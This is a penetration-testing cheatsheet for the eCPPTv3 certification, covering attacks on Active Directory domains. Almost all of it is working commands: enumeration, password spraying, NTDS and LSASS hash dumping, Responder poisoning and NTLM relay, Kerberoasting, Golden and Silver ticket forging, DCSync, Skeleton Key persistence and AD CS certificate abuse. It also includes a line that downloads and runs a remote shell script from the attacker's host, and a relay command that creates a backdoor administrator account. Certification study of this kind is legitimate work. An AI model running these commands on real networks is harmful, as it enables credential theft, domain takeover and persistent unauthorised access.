# 05 — Active Directory
> eCPPTv3 Cheatsheet | Attacker-Mindset Reference

---

## Table of Contents
1. [Environment Setup](#1-environment-setup)
2. [AD Enumeration (Unauthenticated)](#2-ad-enumeration-unauthenticated)
3. [AD Enumeration (Authenticated)](#3-ad-enumeration-authenticated)
4. [BloodHound & SharpHound](#4-bloodhound--sharphound)
5. [Credential Attacks](#5-credential-attacks)
6. [Kerberos Attacks](#6-kerberos-attacks)
7. [Lateral Movement](#7-lateral-movement)
8. [Domain Privilege Escalation](#8-domain-privilege-escalation)
9. [Domain Persistence](#9-domain-persistence)
10. [AD CS Abuse](#10-ad-cs-abuse)
11. [Quick-Win Checklist](#11-quick-win-checklist)

---

## 1. Environment Setup

```bash
# Set your target domain variables for reuse throughout engagement
export DOMAIN="corp.local"
export DC_IP="192.168.1.10"
export USER="jdoe"
export PASS="Password123!"
export LHOST="192.168.1.99"
```

```bash
# Add DC to /etc/hosts so tools resolve the domain correctly
echo "$DC_IP  $DOMAIN dc01.$DOMAIN" >> /etc/hosts
```

```bash
# Sync your clock to the DC — Kerberos fails if time skew > 5 minutes
sudo ntpdate $DC_IP
# OR
sudo rdate -n $DC_IP
```

---

## 2. AD Enumeration (Unauthenticated)

### 2.1 DNS Recon

```bash
# Enumerate DNS to map the AD infrastructure: DCs, mail servers, SRV records
nmap -p 53 --script dns-srv-enum --script-args "dns-srv-enum.domain=$DOMAIN" $DC_IP
```

```bash
# Dump all DNS records from the DC (zone transfer attempt)
dig axfr $DOMAIN @$DC_IP
```

```bash
# Locate domain controllers via SRV records (standard AD discovery method)
nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN $DC_IP
```

```bash
# Resolve the PDC (Primary Domain Controller) specifically
nslookup -type=SRV _kerberos._tcp.$DOMAIN $DC_IP
```

### 2.2 LDAP Anonymous Bind

```bash
# Attempt unauthenticated LDAP query — misconfigs expose user/group info
ldapsearch -x -H ldap://$DC_IP -b "DC=corp,DC=local" "(objectClass=*)" 2>/dev/null | head -100
```

```bash
# Pull naming contexts to understand the domain structure without creds
ldapsearch -x -H ldap://$DC_IP -s base namingcontexts
```

### 2.3 SMB Null Session

```bash
# Try null session to enumerate shares — common on older or misconfigured DCs
smbclient -L //$DC_IP -N
```

```bash
# Enumerate users, groups, shares via null session using enum4linux
enum4linux -a $DC_IP
```

```bash
# Faster alternative to enum4linux with cleaner output
enum4linux-ng -A $DC_IP
```

### 2.4 RPC Null Session

```bash
# Connect to RPC with no credentials to enumerate domain objects
rpcclient -U "" -N $DC_IP
```

```bash
# Inside rpcclient — dump domain users (works on null session misconfig)
rpcclient $DC_IP -U "" -N -c "enumdomusers"
```

```bash
# Inside rpcclient — get detailed info on a specific user by RID
rpcclient $DC_IP -U "" -N -c "queryuser 0x1f4"
```

```bash
# Enumerate domain groups via RPC
rpcclient $DC_IP -U "" -N -c "enumdomgroups"
```

### 2.5 Kerbrute — User Enumeration (No Creds)

```bash
# Validate usernames against Kerberos without triggering account lockout
# Uses AS-REQ — if user exists, DC responds with PREAUTH_REQUIRED instead of PRINCIPAL_UNKNOWN
./kerbrute userenum --dc $DC_IP -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

```bash
# Spray a single password across all enumerated users (careful: lockout threshold)
./kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt "Password123!"
```

---

## 3. AD Enumeration (Authenticated)

### 3.1 LDAP — PowerView (Windows)

```powershell
# Import PowerView into current session
Import-Module .\PowerView.ps1
```

```powershell
# Get full domain info: functional level, DC list, FSMO roles
Get-Domain
```

```powershell
# List all domain controllers
Get-DomainController
```

```powershell
# Enumerate ALL domain users with all properties
Get-DomainUser | select samaccountname, memberof, description, lastlogon, pwdlastset
```

```powershell
# Find users with a description field — admins often store passwords here
Get-DomainUser | Where-Object {$_.description -ne $null} | select samaccountname, description
```

```powershell
# Get all groups in the domain
Get-DomainGroup | select name
```

```powershell
# Enumerate members of Domain Admins group
Get-DomainGroupMember "Domain Admins" -Recurse
```

```powershell
# List all computers in the domain — find servers, workstations, DCs
Get-DomainComputer | select dnshostname, operatingsystem, lastlogon
```

```powershell
# Find computers running outdated OS (high-value targets)
Get-DomainComputer | Where-Object {$_.operatingsystem -like "*2008*" -or $_.operatingsystem -like "*XP*"}
```

```powershell
# Enumerate GPOs — policy objects may contain creds or interesting configs
Get-DomainGPO | select displayname, gpcfilesyspath
```

```powershell
# Find shares across the domain (requires access, runs against each host)
Find-DomainShare -CheckShareAccess
```

```powershell
# Find files containing "password" across readable shares
Find-InterestingDomainShareFile -Include "*password*","*cred*","*.config"
```

```powershell
# Identify where Domain Admins are currently logged in
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

```powershell
# Find machines where you have local admin rights
Find-LocalAdminAccess
```

### 3.2 LDAP — ldapdomaindump (Linux)

```bash
# Dump all AD objects to HTML/JSON files — good offline reference
ldapdomaindump -u "$DOMAIN\\$USER" -p "$PASS" $DC_IP -o ./ldd_output/
```

### 3.3 CrackMapExec — Swiss Army Knife

```bash
# Verify credentials are valid against the domain
crackmapexec smb $DC_IP -u $USER -p $PASS
```

```bash
# Spray creds across a subnet — identify where account has local admin (Pwn3d!)
crackmapexec smb 192.168.1.0/24 -u $USER -p $PASS
```

```bash
# Enumerate logged-on users on a host
crackmapexec smb $DC_IP -u $USER -p $PASS --loggedon-users
```

```bash
# List all shares and check your access level
crackmapexec smb $DC_IP -u $USER -p $PASS --shares
```

```bash
# Dump SAM database (requires local admin on target)
crackmapexec smb $DC_IP -u $USER -p $PASS --sam
```

```bash
# Run a command on remote host via SMB (requires admin)
crackmapexec smb $DC_IP -u $USER -p $PASS -x "whoami /all"
```

```bash
# Use NTLM hash instead of password (Pass-the-Hash)
crackmapexec smb $DC_IP -u $USER -H "aad3b435b51404eeaad3b435b51404ee:NTHASH"
```

### 3.4 Impacket Tools (Linux)

```bash
# Enumerate AD objects via LDAP — lightweight alternative to PowerView
python3 /opt/impacket/examples/GetADUsers.py -all -dc-ip $DC_IP "$DOMAIN/$USER:$PASS"
```

```bash
# Collect domain information: users, groups, trusts, policies
python3 /opt/impacket/examples/samrdump.py "$DOMAIN/$USER:$PASS@$DC_IP"
```

---

## 4. BloodHound & SharpHound

### 4.1 Data Collection

```bash
# Collect all AD data using Python ingestor from Linux (no need to touch target)
bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC_IP -c All
```

```powershell
# Run SharpHound on Windows target — outputs ZIP to import into BloodHound
.\SharpHound.exe -c All --zipfilename bh_output.zip
```

```powershell
# Run with domain credentials if running from non-domain machine
.\SharpHound.exe -c All -d $DOMAIN --ldapusername $USER --ldappassword $PASS
```

### 4.2 BloodHound Startup

```bash
# Start Neo4j database (BloodHound backend)
sudo neo4j start
```

```bash
# Launch BloodHound GUI
bloodhound &
# Default creds: neo4j:neo4j (change on first login)
```

### 4.3 Key BloodHound Queries (Cypher)

```cypher
-- Find all paths from owned users to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
```

```cypher
-- Find all users with DCSync rights
MATCH (u)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain) RETURN u.name
```

```cypher
-- Find computers where Domain Admins are logged in
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
(u)-[:HasSession]->(c:Computer) RETURN u.name, c.name
```

```cypher
-- Find users with unconstrained delegation enabled
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

```cypher
-- Find Kerberoastable accounts with a path to DA
MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
```

```cypher
-- Find AS-REP roastable users
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

---

## 5. Credential Attacks

### 5.1 Password Spraying

```bash
# Spray common passwords via SMB — check lockout policy first (net accounts)
crackmapexec smb $DC_IP -u users.txt -p passwords.txt --continue-on-success
```

```bash
# Spray via LDAP (quieter than SMB on some configs)
crackmapexec ldap $DC_IP -u users.txt -p "Password123!" --continue-on-success
```

```bash
# Check lockout threshold before spraying — stay under the limit
crackmapexec smb $DC_IP -u $USER -p $PASS --pass-pol
```

### 5.2 Hash Dumping

```bash
# Dump NTLM hashes from SAM + SYSTEM (local accounts on target)
crackmapexec smb $TARGET_IP -u $USER -p $PASS --sam
```

```bash
# Dump LSA secrets — may contain service account plaintext or hashes
crackmapexec smb $TARGET_IP -u $USER -p $PASS --lsa
```

```bash
# Dump NTDS.dit (all domain hashes) remotely via VSS shadow copy
crackmapexec smb $DC_IP -u $USER -p $PASS --ntds
```

```bash
# Dump NTDS.dit using secretsdump — gold standard for all domain hashes
python3 /opt/impacket/examples/secretsdump.py "$DOMAIN/$USER:$PASS@$DC_IP"
```

```bash
# Dump using hash instead of password
python3 /opt/impacket/examples/secretsdump.py -hashes ":NTHASH" "$DOMAIN/$USER@$DC_IP"
```

```bash
# Dump cached domain credentials (DCC2) from a workstation
python3 /opt/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
```

### 5.3 LLMNR/NBT-NS Poisoning (Responder)

```bash
# Poison LLMNR/mDNS/NBT-NS — captures NTLMv2 hashes when users hit non-existent shares
sudo responder -I eth0 -wF
```

```bash
# Run Responder in analyze mode (passive — won't poison, just observe)
sudo responder -I eth0 -A
```

```bash
# Crack captured NTLMv2 hash with hashcat
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

### 5.4 NTLM Relay

```bash
# Relay NTLMv2 to target hosts — requires SMB signing disabled on target
# Step 1: Disable SMB/HTTP in Responder.conf first (relay, don't capture)
sudo sed -i 's/SMB = On/SMB = Off/;s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
sudo responder -I eth0 -wF
```

```bash
# Step 2: Run ntlmrelayx targeting DC or another host
python3 /opt/impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support
```

```bash
# Relay and dump SAM automatically when relay succeeds
python3 /opt/impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support --no-http-server
```

```bash
# Relay and execute a command on target
python3 /opt/impacket/examples/ntlmrelayx.py -tf targets.txt -smb2support -c "net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add"
```

```bash
# Find hosts with SMB signing disabled (vulnerable to relay)
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

---

## 6. Kerberos Attacks

### 6.1 AS-REP Roasting

```bash
# Find + dump AS-REP hashes for users with "Do not require Kerberos preauthentication" set
# No creds needed — only a username list required
python3 /opt/impacket/examples/GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP
```

```bash
# With valid creds — auto-enumerate vulnerable accounts
python3 /opt/impacket/examples/GetNPUsers.py "$DOMAIN/$USER:$PASS" -request -dc-ip $DC_IP
```

```powershell
# PowerView: find accounts with preauth disabled
Get-DomainUser -PreauthNotRequired | select samaccountname
```

```bash
# Crack AS-REP hash (hashcat mode 18200)
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt --force
```

### 6.2 Kerberoasting

```bash
# Request TGS tickets for all accounts with an SPN — tickets encrypted with account's NTLM hash
python3 /opt/impacket/examples/GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -request
```

```bash
# Output tickets to file for cracking
python3 /opt/impacket/examples/GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt
```

```powershell
# PowerView: enumerate Kerberoastable accounts
Get-DomainUser -SPN | select samaccountname, serviceprincipalname
```

```bash
# Crack TGS hash (hashcat mode 13100)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### 6.3 Pass-the-Ticket (PTT)

```bash
# Export all Kerberos tickets from memory (Windows — run as target user)
# Mimikatz: dump tickets from LSASS
sekurlsa::tickets /export
```

```bash
# Import a stolen .kirbi ticket into current session
kerberos::ptt ticket.kirbi
```

```bash
# Use stolen ticket with impacket (from Linux) — convert .kirbi to .ccache
python3 /opt/impacket/examples/ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=./ticket.ccache
python3 /opt/impacket/examples/psexec.py -k -no-pass $DOMAIN/$USER@$TARGET
```

### 6.4 Overpass-the-Hash (OPtH)

```bash
# Use NTLM hash to request a Kerberos TGT — pivots hash into full Kerberos auth
# Mimikatz (on Windows):
sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:NTHASH /run:powershell.exe
```

### 6.5 Golden Ticket

```bash
# Forge a TGT using the KRBTGT hash — grants unlimited access to the domain
# Requires: KRBTGT NTLM hash + Domain SID

# Step 1: Get KRBTGT hash (after DA)
python3 /opt/impacket/examples/secretsdump.py "$DOMAIN/$USER:$PASS@$DC_IP" | grep krbtgt

# Step 2: Get Domain SID
python3 /opt/impacket/examples/getPac.py "$DOMAIN/$USER:$PASS" -targetUser krbtgt -dc-ip $DC_IP
# OR via rpcclient:
rpcclient $DC_IP -U "$USER%$PASS" -c "lsaquery"
```

```bash
# Forge Golden Ticket with impacket ticketer
python3 /opt/impacket/examples/ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXXXXXXX -domain $DOMAIN fakeadmin
export KRB5CCNAME=./fakeadmin.ccache
python3 /opt/impacket/examples/psexec.py -k -no-pass $DOMAIN/fakeadmin@$DC_IP
```

```bash
# Mimikatz: forge Golden Ticket (Windows)
kerberos::golden /user:fakeadmin /domain:$DOMAIN /sid:S-1-5-21-XXXX /krbtgt:KRBTGT_HASH /ptt
```

### 6.6 Silver Ticket

```bash
# Forge a TGS for a specific service using the service account hash (no DC contact needed)
# More stealthy than Golden — only touches the target service

python3 /opt/impacket/examples/ticketer.py \
  -nthash SERVICE_ACCOUNT_HASH \
  -domain-sid S-1-5-21-XXXXXXXXXX \
  -domain $DOMAIN \
  -spn cifs/$TARGET.$DOMAIN \
  fakeadmin

export KRB5CCNAME=./fakeadmin.ccache
python3 /opt/impacket/examples/smbclient.py -k $TARGET.$DOMAIN
```

### 6.7 Unconstrained Delegation Abuse

```bash
# Find computers with unconstrained delegation (TGTs forwarded to them)
Get-DomainComputer -Unconstrained | select dnshostname
```

```bash
# If you have code exec on the delegated machine, dump cached TGTs from memory
# Mimikatz:
sekurlsa::tickets /export
# Look for tickets belonging to DA or DC machine accounts
```

```bash
# Printer Bug — force DC to authenticate to your unconstrained delegation host
# Using SpoolSample or printerbug.py to trigger DC auth
python3 /opt/impacket/examples/printerbug.py "$DOMAIN/$USER:$PASS" $DC_IP $UNCONSTRAINED_HOST
```

### 6.8 Constrained Delegation Abuse

```bash
# Find accounts with constrained delegation configured
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select dnshostname, msds-allowedtodelegateto
```

```bash
# Request a TGS as any user to the delegated service (S4U2Self + S4U2Proxy)
python3 /opt/impacket/examples/getST.py -spn "cifs/$DC_IP" -impersonate Administrator \
  "$DOMAIN/$SERVICE_USER:$PASS" -dc-ip $DC_IP

export KRB5CCNAME=./Administrator.ccache
python3 /opt/impacket/examples/secretsdump.py -k -no-pass $DC_IP
```

---

## 7. Lateral Movement

### 7.1 PsExec (SMB + Remote Service)

```bash
# Get SYSTEM shell via SMB — uploads & runs a service binary (noisy, detected easily)
python3 /opt/impacket/examples/psexec.py "$DOMAIN/$USER:$PASS@$TARGET_IP"
```

```bash
# PsExec with hash
python3 /opt/impacket/examples/psexec.py -hashes ":NTHASH" "$DOMAIN/$USER@$TARGET_IP"
```

### 7.2 WMIExec (WMI — semi-interactive)

```bash
# Remote exec via WMI — doesn't create a service, harder to detect than psexec
python3 /opt/impacket/examples/wmiexec.py "$DOMAIN/$USER:$PASS@$TARGET_IP"
```

```bash
# Execute a single command via WMI
python3 /opt/impacket/examples/wmiexec.py "$DOMAIN/$USER:$PASS@$TARGET_IP" "whoami"
```

### 7.3 SMBExec

```bash
# Shell via SMB without uploading a binary — uses cmd.exe redirection via service
python3 /opt/impacket/examples/smbexec.py "$DOMAIN/$USER:$PASS@$TARGET_IP"
```

### 7.4 Evil-WinRM

```bash
# WinRM shell (port 5985/5986) — best interactive shell experience
evil-winrm -i $TARGET_IP -u $USER -p $PASS
```

```bash
# WinRM with NTLM hash
evil-winrm -i $TARGET_IP -u $USER -H NTHASH
```

```bash
# Upload file to target via evil-winrm
upload /local/path/file.exe C:\Windows\Temp\file.exe
```

```bash
# Load PowerShell scripts directly into memory via evil-winrm
evil-winrm -i $TARGET_IP -u $USER -p $PASS -s /opt/scripts/
```

### 7.5 Pass-the-Hash

```bash
# Authenticate using only the NTLM hash — no password needed
python3 /opt/impacket/examples/wmiexec.py -hashes ":NTHASH" "$DOMAIN/$USER@$TARGET_IP"
crackmapexec smb $TARGET_IP -u $USER -H NTHASH
```

### 7.6 CrackMapExec — Lateral Movement

```bash
# Execute payload across all hosts where account is local admin
crackmapexec smb 192.168.1.0/24 -u $USER -p $PASS -x "powershell -enc BASE64PAYLOAD"
```

```bash
# Download and execute a script in memory (fileless)
crackmapexec smb $TARGET_IP -u $USER -p $PASS -X "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
```

---

## 8. Domain Privilege Escalation

### 8.1 ACL / ACE Abuse

```powershell
# Find all ACEs where a user/group has dangerous rights over other objects
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -like "*your_user*"}
```

```powershell
# GenericAll on user — reset their password
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
```

```powershell
# GenericAll/GenericWrite on group — add yourself to it
Add-DomainGroupMember -Identity "Domain Admins" -Members $USER
```

```powershell
# WriteDACL on domain object — grant yourself DCSync rights
Add-DomainObjectAcl -TargetIdentity $DOMAIN -PrincipalIdentity $USER -Rights DCSync
```

```powershell
# ForceChangePassword ACE — change password of target user without knowing current
$SecPass = ConvertTo-SecureString "H@cked123!" -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $SecPass
```

### 8.2 DCSync (Replicating Domain Hashes)

```bash
# Simulate a Domain Controller replication request to dump all hashes
# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All (DA, DCSync ACE)
python3 /opt/impacket/examples/secretsdump.py "$DOMAIN/$USER:$PASS@$DC_IP" -just-dc-ntlm
```

```bash
# Dump only specific account (e.g., krbtgt for Golden Ticket)
python3 /opt/impacket/examples/secretsdump.py "$DOMAIN/$USER:$PASS@$DC_IP" -just-dc-user krbtgt
```

```bash
# Mimikatz DCSync (run on Windows with DA or DCSync rights)
lsadump::dcsync /domain:$DOMAIN /user:krbtgt
lsadump::dcsync /domain:$DOMAIN /all /csv
```

### 8.3 GPO Abuse

```powershell
# Find GPOs you have write access to
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write" -and $_.IdentityReference -match $USER}
```

```powershell
# Abuse GPO write rights — add a local admin via GPO using SharpGPOAbuse
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $USER --GPOName "Vulnerable GPO"
```

### 8.4 AdminSDHolder Abuse

```bash
# If you have write access to AdminSDHolder container, any ACE propagates to DA/protected groups
# Add GenericAll to AdminSDHolder — SDProp runs every 60 mins and grants rights
python3 /opt/impacket/examples/dacledit.py "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP \
  -principal $USER -target "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -action write -rights FullControl
```

---

## 9. Domain Persistence

### 9.1 Golden Ticket (see §6.5)
- Valid for 10 years by default
- Survives domain password resets (except KRBTGT reset twice)
- Requires KRBTGT hash

### 9.2 Silver Ticket (see §6.6)
- No DC contact needed to forge
- Service-specific
- Hard to detect (no DC logging)

### 9.3 Skeleton Key

```bash
# Patch LSASS to allow any user to authenticate with a master password ("mimikatz")
# Requires DA, non-persistent (cleared on reboot)
misc::skeleton
# Now any user can auth with password "mimikatz" OR their real password
```

### 9.4 DSRM Account Abuse

```bash
# Enable DSRM account for remote login (registry change + persistence)
# DSRM = local admin of DC, with its own hash — survives domain resets
# Dump DSRM hash
lsadump::lsa /patch
# Enable remote DSRM login
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
# Now PtH with DSRM hash
python3 /opt/impacket/examples/secretsdump.py -hashes ":DSRM_HASH" ".\Administrator@$DC_IP"
```

### 9.5 Custom SSP (Security Support Provider)

```bash
# Register a malicious SSP DLL to capture all logins in plaintext
# Mimikatz (in-memory, non-persistent):
misc::memssp
# Captured creds written to: C:\Windows\System32\mimilsa.log
```

---

## 10. AD CS Abuse

### 10.1 Enumerate AD CS

```bash
# Find Certificate Authority and vulnerable templates
python3 /opt/impacket/examples/certipy find "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP -vulnerable -stdout
```

```bash
# GUI alternative — enumerate with Certify (Windows)
.\Certify.exe find /vulnerable
```

### 10.2 ESC1 — Template with Client Auth + Enrollee Supplies Subject

```bash
# Request a cert as any user (e.g., DA) using vulnerable template
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca CORP-CA -template VulnerableTemplate \
  -upn administrator@$DOMAIN -dc-ip $DC_IP
```

```bash
# Use the cert to get the NT hash of the target account
certipy auth -pfx administrator.pfx -dc-ip $DC_IP
```

### 10.3 ESC4 — Write Rights on Certificate Template

```bash
# Modify a template to make it ESC1-vulnerable, then exploit
certipy template -u "$USER@$DOMAIN" -p "$PASS" -template VulnerableTemplate -save-old -dc-ip $DC_IP
certipy req -u "$USER@$DOMAIN" -p "$PASS" -ca CORP-CA -template VulnerableTemplate \
  -upn administrator@$DOMAIN -dc-ip $DC_IP
```

### 10.4 ESC8 — NTLM Relay to AD CS HTTP Endpoint

```bash
# Relay DC machine account auth to AD CS web enrollment
# Step 1: Trigger DC auth (printerbug / PetitPotam)
python3 /opt/impacket/examples/printerbug.py "$DOMAIN/$USER:$PASS" $DC_IP $LHOST

# Step 2: Relay to AD CS and request DC cert
python3 /opt/impacket/examples/ntlmrelayx.py -t "http://$CA_SERVER/certsrv/certfnsh.asp" \
  -smb2support --adcs --template "DomainController"
```

```bash
# Authenticate as DC using obtained cert (PKINITTools or certipy)
certipy auth -pfx dc.pfx -dc-ip $DC_IP
# Returns DC machine account hash → DCSync
```

---

## 11. Quick-Win Checklist

```
[ ] Null session SMB/RPC — anonymous enumeration
[ ] Kerbrute username enumeration — build user list
[ ] Password spray — Password123!, SeasonYear!, CompanyName1!
[ ] Responder + LLMNR poisoning — passive NTLMv2 capture
[ ] AS-REP Roast — users with preauth disabled
[ ] Kerberoast — SPN accounts with crackable TGS
[ ] BloodHound — shortest path to DA
[ ] Check descriptions for passwords — Get-DomainUser | select description
[ ] Check SYSVOL/NETLOGON for GPP creds (MS14-025)
[ ] Find SMB signing disabled hosts — relay candidates
[ ] Unconstrained delegation hosts — printer bug abuse
[ ] Find ACL misconfigurations — WriteDACL, GenericAll, ForceChangePassword
[ ] AD CS — certipy find -vulnerable
[ ] Check local admin access across subnet — CME spray
[ ] LAPS — try reading ms-Mcs-AdmPwd if permissions allow
```

---

### Key Ports Reference

| Port | Service | Why It Matters |
|------|---------|----------------|
| 88 | Kerberos | Ticket attacks, AS-REP/Kerberoast, kerbrute |
| 135 | RPC | Enumeration, WMI exec |
| 139/445 | SMB | Hash capture, relay, exec, share enum |
| 389/636 | LDAP/LDAPS | Enumeration, BloodHound collection |
| 5985/5986 | WinRM | Evil-WinRM shells |
| 3268/3269 | Global Catalog | Cross-domain queries |
| 80/443 | HTTP/S | AD CS web enrollment (ESC8) |

---

*eCPPTv3 Cheatsheet — 05_active_directory.md*
